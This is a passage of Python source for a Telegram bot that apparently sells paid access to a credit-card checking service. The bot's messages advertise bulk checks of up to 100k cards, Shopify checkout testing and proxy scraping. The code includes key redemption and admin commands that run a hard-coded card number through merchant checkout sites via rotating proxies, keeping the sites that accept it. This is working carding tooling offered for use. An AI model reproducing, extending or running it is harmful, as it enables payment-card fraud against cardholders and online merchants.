<b>🔑 ᴋᴇʏ:</b> <code>{key[:20]}...</code>
<b>💎 ᴅᴜʀᴀᴛɪᴏɴ:</b> {days} ᴅᴀʏs
<b>📱 ᴅᴇᴠɪᴄᴇs:</b> {devices_used}/{device_limit}
<b>📊 ᴘʀᴏɢʀᴇss:</b> {progress}
<b>📅 ᴄʀᴇᴀᴛᴇᴅ:</b> {created}
━━━━━━━━━━━━━━━━━━━━
<b>👥 ᴀssᴏᴄɪᴀᴛᴇᴅ ᴜꜱᴇʀs:</b>
{users_text}"""
    await event.reply(premium_emoji(msg), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/redeem\s+(.+)'))
async def redeem_cmd(event):
    user_id = event.sender_id
    key_input = event.pattern_match.group(1).strip().upper()
    if not key_input:
        await event.reply(premium_emoji("""<b>❗ ɪɴᴠᴀʟɪᴅ ᴄᴏᴍᴍᴀɴᴅ</b>
━━━━━━━━━━━━━━━━━━━━
<b>👤 ᴜꜱᴀɢᴇ:</b> <code>/redeem KEY_HERE</code>
<b>💡 ᴇxᴀᴍᴘʟᴇ:</b>
<code>/redeem FOR-IT-MULTI-A1B2C3-30D-50U</code>
━━━━━━━━━━━━━━━━━━━━
<b>👑 ᴋᴇʏ ʟᴇɴᴇ:</b> <a href="tg://user?id=8823705089">@ook83</a></b>"""), parse_mode="html")
        return
    keys_list = [k.strip() for k in re.split(r'[\s\n]+', key_input) if k.strip()]
    if len(keys_list) > 1:
        await event.reply(premium_emoji("""<b>❗ ᴍᴜʟᴛɪᴘʟᴇ ᴋᴇʏs ᴅᴇᴛᴇᴄᴛᴇᴅ</b>
━━━━━━━━━━━━━━━━━━━━
<b>⚠️ ᴇᴋ ʙᴀᴀʀ ᴍᴇ sɪʀꜰ ᴇᴋ ᴋᴇʏ ᴅᴀᴀʟ sᴀᴋᴛᴇ ʜᴏ!</b>
<b>💡 ᴇᴋ ᴋᴇʏ ᴅᴀᴀʟᴏ:</b> <code>/redeem KEY_HERE</code>"""), parse_mode="html")
        return
    key = keys_list[0]
    processing_msg = await event.reply(premium_emoji("""<b>🔄 ᴘʀᴏᴄᴇssɪɴɢ ᴋᴇʏ...</b>
👤 <b>ᴠᴇʀɪꜰʏɪɴɢ ᴅᴀᴛᴀ ʙᴀꜱᴇ ᴋᴇʏ...</b>"""), parse_mode="html")
    await asyncio.sleep(2)
    result = redeem_multi_device_key(key, user_id)
    if result == "success":
        try:
            await processing_msg.delete()
        except:
            pass
        key_info = get_key_info(key)
        expiry = key_info.get('expiry', 'ᴀᴄᴛɪᴠᴇ')
        devices_used = key_info.get('used', 0)
        device_limit = key_info.get('limit', 0)
        await event.reply(premium_emoji(f"""<b>🎉 ᴋᴇʏ ᴀᴄᴛɪᴠᴀᴛᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ! 🎉</b>
━━━━━━━━━━━━━━━━━━━━
💎 <b>sᴛᴀᴛᴜs:</b> ᴀᴄᴛɪᴠᴀᴛᴇᴅ ᴀᴄᴛɪᴠᴇ
👤 <b>ᴜsᴇʀ ɪᴅ:</b> <code>{user_id}</code>
⏳ <b>ᴇxᴘɪʀʏ:</b> {expiry}
━━━━━━━━━━━━━━━━━━━━
📱 <b>ᴅᴇᴠɪᴄᴇ ᴜsᴀɢᴇ:</b> {devices_used}/{device_limit}
🔑 <b>ᴋᴇʏ:</b> <code>{key[:15]}...</code>
━━━━━━━━━━━━━━━━━━━━
<b>🔓 ᴘʀᴇᴍɪᴜᴍ ꜰᴇᴀᴛᴜʀᴇs:</b>
✅ ᴜɴʟɪᴍɪᴛᴇᴅ ᴄᴄ ᴄʜᴇᴄᴋs
✅ ᴀᴜᴛʜ + sʜᴏᴘɪꜰʏ
✅ ɴᴏ ᴅᴀɪʟʏ ʟɪᴍɪᴛ
✅ ʙᴜʟᴋ ᴄʜᴇᴄᴋ ᴜᴘ ᴛᴏ 100ᴋ
✅ ᴀᴜᴛᴏ ᴘʀᴏxʏ sᴄʀᴀᴘᴇʀ
━━━━━━━━━━━━━━━━━━━━
<b>📋 ᴄᴏᴍᴍᴀɴᴅs:</b>
<code>/cc card|mm|yy|cvv</code> ▸ sɪɴɢʟᴇ
<code>/chk</code> ▸ ʙᴜʟᴋ ᴄʜᴇᴄᴋ
<code>/plan</code> ▸ ᴘʟᴀɴ sᴛᴀᴛᴜs
━━━━━━━━━━━━━━━━━━━━
👑 <b>ʙᴏᴛ ᴏᴡɴᴇʀ:</b> <a href="tg://user?id=8823705089">◢◤◢◤shopiixprobot◤◢◤◢</a></b>"""), parse_mode="html")
    elif result == "already_premium":
        try:
            await processing_msg.delete()
        except:
            pass
        await event.reply(premium_emoji("""<b>⚠️ ᴀᴄᴄᴏᴜɴᴛ ᴀʟʀᴇᴀᴅʏ ᴀᴄᴛɪᴠᴇ!</b>
━━━━━━━━━━━━━━━━━━━━
💎 <b>ᴀᴀᴘᴋᴀ ᴀᴄᴄᴏᴜɴᴛ ᴘᴇʜʟᴇ sᴇ ᴀᴄᴛɪᴠᴇ ʜᴀɪ!</b>
📊 <b>ᴘʟᴀɴ:</b> <code>/plan</code>
👑 <b>ᴏᴡɴᴇʀ:</b> <a href="tg://user?id=8823705089">@ook83</a></b>"""), parse_mode="html")
    elif result == "device_limit_reached":
        try:
            await processing_msg.delete()
        except:
            pass
        key_info = get_key_info(key)
        device_limit = key_info.get('limit', 0)
        await event.reply(premium_emoji(f"""<b>❗ ᴅᴇᴠɪᴄᴇ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ!</b>
━━━━━━━━━━━━━━━━━━━━
🔑 <b>ʏᴇʜ ᴋᴇʏ ᴀᴘɴᴇ ᴍᴀx ᴅᴇᴠɪᴄᴇs ᴋᴏ ʀᴇᴀᴄʜ ᴋᴀʀ ᴄᴜᴋᴀ!</b>
📱 <b>ᴍᴀx ᴅᴇᴠɪᴄᴇs:</b> {device_limit}
━━━━━━━━━━━━━━━━━━━━
💡 <b>ɴᴀʏᴀ ᴋᴇʏ ᴋᴇ ʟɪʏᴇ:</b>
👑 <a href="tg://user?id=8823705089">@ook83</a></b>"""), parse_mode="html")
    elif result == "used":
        try:
            await processing_msg.delete()
        except:
            pass
        await event.reply(premium_emoji(f"""<b>❗ ᴋᴇʏ ᴀʟʀᴇᴀᴅʏ ᴜsᴇᴅ!</b>
━━━━━━━━━━━━━━━━━━━━
🔑 <b>ʏᴇʜ ᴋᴇʏ ᴀᴀᴘᴋᴇ ᴅᴜᴀʀᴀ ᴘᴇʜʟᴇ ᴜsᴇ ʜᴏ ᴄᴜᴋɪ ʜᴀɪ!</b>
━━━━━━━━━━━━━━━━━━━━
👑 <b>ᴏᴡɴᴇʀ:</b> <a href="tg://user?id=8823705089">@ook83</a></b>
📅 <b>ᴘʀɪᴄᴇs: ₹200/ᴡᴇᴇᴋ</b>"""), parse_mode="html")
    else:
        try:
            await processing_msg.delete()
        except:
            pass
        await event.reply(premium_emoji("""<b>❗ ɪɴᴠᴀʟɪᴅ ᴋᴇʏ!</b>
━━━━━━━━━━━━━━━━━━━━
🔑 <b>ʏᴇʜ ᴋᴇʏ ᴠᴀʟɪᴅ ɴᴀʜɪ ʜᴀɪ ʏᴀ ᴇxᴘɪʀᴇ ʜᴏ ᴄʜᴜᴋɪ ʜᴀɪ!</b>
━━━━━━━━━━━━━━━━━━━━
💡 <b>ɴᴀʏᴀ ᴋᴇʏ ᴋᴇ ʟɪʏᴇ:</b>
👑 <a href="tg://user?id=8823705089">@ook83</a></b>"""), parse_mode="html")


# =====================================================================
# ===================== NEW COMMANDS (REQUESTED) ======================
# =====================================================================

# ---- /testcc — Filter sites using ONE test proxy ----
@bot.on(events.NewMessage(pattern=r'^/testcc$'))
async def testcc_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❗ <b>Admin only.</b>"), parse_mode="html")
        return

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji(
            "❗ <b>Reply to a .txt file of sites with</b> <code>/testcc</code>"),
            parse_mode="html")
        return

    reply = await event.get_reply_message()
    if not reply.file or not str(reply.file.name).lower().endswith(".txt"):
        await event.reply(premium_emoji("❗ <b>Reply to a .txt file only.</b>"), parse_mode="html")
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❗ <b>No proxies in proxy.txt.</b>"), parse_mode="html")
        return

    proxy = random.choice(proxies)
    status = await event.reply(premium_emoji("🔄 <b>Reading file…</b>"), parse_mode="html")

    path = await reply.download_media()
    try:
        async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
            content = await f.read()
    finally:
        try: os.remove(path)
        except: pass

    sites = [ln.strip() for ln in content.splitlines()
             if ln.strip() and not ln.strip().startswith("#")]
    sites = [s if s.startswith("http") else f"https://{s}" for s in sites]
    sites = list(dict.fromkeys(sites))

    if not sites:
        await status.edit(premium_emoji("❗ <b>No sites in file.</b>"), parse_mode="html")
        return

    await status.edit(premium_emoji(
        f"🔄 <b>Testing {len(sites)} sites</b>\n"
        f"📶 Proxy: <code>{proxy}</code>"), parse_mode="html")

    TEST_CC = "5154623245618097|03|2032|156"
    alive, dead = [], []
    checked = 0
    BATCH = 5

    async def test_one(site: str) -> bool:
        try:
            url = f"{get_api()}?site={site}&cc={TEST_CC}&proxy={proxy}"
            timeout = aiohttp.ClientTimeout(total=25)
            async with aiohttp.ClientSession(timeout=timeout) as sess:
                async with sess.get(url, ssl=False) as r:
                    raw = await r.json(content_type=None)
            if not isinstance(raw, dict):
                return False
            resp = str(raw.get("Response", raw.get("response", ""))).lower()
            price = str(raw.get("Price", raw.get("price", "-")))
            # alive if price is a real number
            try:
                float(str(price).replace("$", "").replace(",", "").strip())
                return True
            except (ValueError, TypeError):
                pass
            if is_dead_site_error(resp) or not resp.strip():
                return False
            bad = ("product not found", "no product", "sold out",
                   "out of stock", "failed to detect product",
                   "failed to create checkout", "not available")
            return not any(b in resp for b in bad)
        except Exception:
            return False

    for i in range(0, len(sites), BATCH):
        chunk = sites[i:i + BATCH]
        results = await asyncio.gather(*[test_one(s) for s in chunk], return_exceptions=True)
        for site, ok in zip(chunk, results):
            checked += 1
            (alive if ok is True else dead).append(site)
        try:
            await status.edit(premium_emoji(
                f"🔄 <b>Testing sites…</b>\n"
                f"📊 Progress: <code>{checked}/{len(sites)}</code>\n"
                f"✅ Alive: <code>{len(alive)}</code> | ❗ Dead: <code>{len(dead)}</code>"),
                parse_mode="html")
        except Exception:
            pass

    if alive:
        out_name = f"testcc_alive_{user_id}_{int(time.time())}.txt"
        async with aiofiles.open(out_name, "w", encoding="utf-8") as f:
            await f.write("\n".join(alive))
        await bot.send_message(
            user_id,
            f"✅ <b>{len(alive)} live sites with products</b>",
            file=out_name, parse_mode="html")
        try: os.remove(out_name)
        except: pass

    await status.edit(premium_emoji(
        f"✅ <b>/testcc complete</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Total tested : <code>{len(sites)}</code>\n"
        f"✅ Alive (product): <code>{len(alive)}</code>\n"
        f"❗ Removed (dead/empty): <code>{len(dead)}</code>\n"
        f"📶 Proxy used: <code>{proxy}</code>"),
        parse_mode="html")


# ---- /uploadsites — REPLACE bot sites file ----
@bot.on(events.NewMessage(pattern=r'^/uploadsites$'))
async def upload_sites_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❗ <b>Admin only.</b>"), parse_mode="html")
        return

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji(
            "❗ <b>Reply to a .txt file of sites with</b> <code>/uploadsites</code>"),
            parse_mode="html")
        return

    reply = await event.get_reply_message()
    if not reply.file or not str(reply.file.name).lower().endswith(".txt"):
        await event.reply(premium_emoji("❗ <b>Reply to a .txt file only.</b>"), parse_mode="html")
        return

    status = await event.reply(premium_emoji("🔄 <b>Uploading sites…</b>"), parse_mode="html")

    path = await reply.download_media()
    try:
        async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
            content = await f.read()
    finally:
        try: os.remove(path)
        except: pass

    new_sites = [ln.strip() for ln in content.splitlines()
                 if ln.strip() and not ln.strip().startswith("#")]
    new_sites = [s if s.startswith("http") else f"https://{s}" for s in new_sites]
    new_sites = list(dict.fromkeys(new_sites))

    if not new_sites:
        await status.edit(premium_emoji("❗ <b>No sites found in file.</b>"), parse_mode="html")
        return

    old_count = 0
    if os.path.exists(SITES_FILE):
        async with aiofiles.open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
            old_lines = [l.strip() for l in (await f.read()).splitlines() if l.strip()]
        old_count = len(old_lines)
        if old_lines:
            backup = f"sites_backup_{int(time.time())}.txt"
            async with aiofiles.open(backup, "w", encoding="utf-8") as f:
                await f.write("\n".join(old_lines))
            await bot.send_message(user_id, f"💾 <b>Old {old_count} sites backed up</b>",
                                   file=backup, parse_mode="html")
            try: os.remove(backup)
            except: pass

    async with aiofiles.open(SITES_FILE, "w", encoding="utf-8") as f:
        await f.write("\n".join(new_sites) + "\n")

    await status.edit(premium_emoji(
        f"✅ <b>Sites replaced successfully</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🗑 Old sites removed : <code>{old_count}</code>\n"
        f"📥 New sites added   : <code>{len(new_sites)}</code>\n"
        f"📄 File: <code>{SITES_FILE}</code>"),
        parse_mode="html")


# ---- /uploadproxy — REPLACE bot proxies file ----
@bot.on(events.NewMessage(pattern=r'^/uploadproxy$'))
async def upload_proxy_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❗ <b>Admin only.</b>"), parse_mode="html")
        return

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji(
            "❗ <b>Reply to a .txt file of proxies with</b> <code>/uploadproxy</code>"),
            parse_mode="html")
        return

    reply = await event.get_reply_message()
    if not reply.file or not str(reply.file.name).lower().endswith(".txt"):
        await event.reply(premium_emoji("❗ <b>Reply to a .txt file only.</b>"), parse_mode="html")
        return

    status = await event.reply(premium_emoji("🔄 <b>Uploading proxies…</b>"), parse_mode="html")

    path = await reply.download_media()
    try:
        async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
            content = await f.read()
    finally:
        try: os.remove(path)
        except: pass

    new_proxies = []
    for ln in content.splitlines():
        ln = ln.strip()
        if not ln or ln.startswith("#"):
            continue
        if ":" not in ln:
            continue
        new_proxies.append(ln)
    new_proxies = list(dict.fromkeys(new_proxies))

    if not new_proxies:
        await status.edit(premium_emoji("❗ <b>No valid proxies found in file.</b>"), parse_mode="html")
        return

    old_count = 0
    if os.path.exists(PROXY_FILE):
        async with aiofiles.open(PROXY_FILE, "r", encoding="utf-8", errors="ignore") as f:
            old_lines = [l.strip() for l in (await f.read()).splitlines() if l.strip()]
        old_count = len(old_lines)
        if old_lines:
            backup = f"proxy_backup_{int(time.time())}.txt"
            async with aiofiles.open(backup, "w", encoding="utf-8") as f:
                await f.write("\n".join(old_lines))
            await bot.send_message(user_id, f"💾 <b>Old {old_count} proxies backed up</b>",
                                   file=backup, parse_mode="html")
            try: os.remove(backup)
            except: pass

    async with aiofiles.open(PROXY_FILE, "w", encoding="utf-8") as f:
        await f.write("\n".join(new_proxies) + "\n")

    await status.edit(premium_emoji(
        f"✅ <b>Proxies replaced successfully</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🗑 Old proxies removed : <code>{old_count}</code>\n"
        f"📥 New proxies added   : <code>{len(new_proxies)}</code>\n"
        f"📄 File: <code>{PROXY_FILE}</code>"),
        parse_mode="html")


# ===================== RUN BOT =====================
print("🤖 Bot starting...")
bot.run_until_disconnected()
